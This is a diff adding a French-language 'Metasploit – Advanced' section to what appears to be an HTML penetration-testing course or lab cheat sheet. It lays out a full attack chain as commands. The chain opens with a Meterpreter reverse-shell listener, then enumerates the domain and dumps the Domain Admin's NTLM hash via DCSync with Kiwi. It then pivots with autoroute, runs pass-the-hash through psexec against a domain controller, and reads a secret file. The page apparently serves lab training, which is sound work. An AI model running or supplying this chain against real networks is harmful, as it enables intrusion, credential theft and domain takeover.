@@ -1310,7 +1310,107 @@ su root2
 Vous devez exécuter cette commande en tant que propriétaire du fichier, c’est-à-dire <b>root</b>.</p>
 
   </div>
-  <div id="s14" class="content"><div class="section-title">XIV. Metasploit – Advanced</div></div>
+  <div id="s14" class="content"><div class="section-title">XIV. Metasploit – Advanced</div>
+  <h3>🔁 Reverse Shell (Metasploit)</h3>
+
+<p>
+  Ouvrez un terminal et lancez Metasploit :
+</p>
+
+<pre><code>msfconsole</code></pre>
+
+<p>
+  Configurez un listener Meterpreter pour une cible Windows :
+</p>
+
+<pre><code>use multi/handler
+set LHOST 11.0.129.51
+set LPORT 5555
+set payload windows/x64/meterpreter_reverse_tcp
+exploit
+</code></pre>
+
+<p>
+  Une fois connecté, exécutez :
+</p>
+
+<pre><code>ifconfig</code></pre>
+
+<hr>
+
+<h3>🔍 Enumeration</h3>
+
+<p>
+  Avec l’accès Meterpreter, commencez la reconnaissance du système distant.
+  Voici des commandes utiles :
+</p>
+
+<pre><code># Informations système de la machine compromise
+sysinfo
+
+# Affiche l’utilisateur actuellement connecté
+getuid
+
+# Enumération du domaine et du contrôleur de domaine
+run post/windows/gather/enum_domain
+</code></pre>
+
+<hr>
+
+<h3>🔓 Dump des Hashs (DCSync via Kiwi)</h3>
+
+<p>Chargez le module Kiwi :</p>
+
+<pre><code>load kiwi</code></pre>
+
+<p>Lancez DCSync pour obtenir le hash NTLM :</p>
+
+<pre><code>dcsync_ntlm &lt;domain&gt;\\&lt;username&gt;</code></pre>
+
+<p>Exemple demandé :</p>
+
+<pre><code>load kiwi
+dcsync_ntlm COMMENSURATE\\DomainAdmin
+</code></pre>
+
+<hr>
+
+<h3>🌐 Pivoting (Autoroute)</h3>
+
+<p>
+  Utilisez le module <b>autoroute</b> pour pivoter sur le réseau interne :
+</p>
+
+<pre><code>run post/multi/manage/autoroute SUBNET=172.16.1.0 ACTION=ADD</code></pre>
+
+<p>
+  Revenez au shell Metasploit :
+</p>
+
+<pre><code>background</code></pre>
+
+<hr>
+
+<h3>🛠️ Pass-the-Hash via PSExec</h3>
+
+<p>
+  Utilisez le module PSExec de Metasploit pour attaquer le contrôleur de domaine :
+</p>
+
+<pre><code>use exploit/windows/smb/psexec
+set RHOST 172.16.1.4
+set SMBUser DomainAdmin
+set SMBPass 00000000000000000000000000000000:5143c7e6b7a93079b96bdfafd8cb8dc5
+exploit
+</code></pre>
+
+<p>
+  Une fois la nouvelle session Meterpreter ouverte, affichez le fichier sensible :
+</p>
+
+<pre><code>cat C:\\secret.txt</code></pre>
+
+  </div>
   <div id="s15" class="content"><div class="section-title">XV. Reverse Shells – Advanced</div></div>
   <div id="s16" class="content"><div class="section-title">XVI. Exfiltration – Advanced</div></div>
 
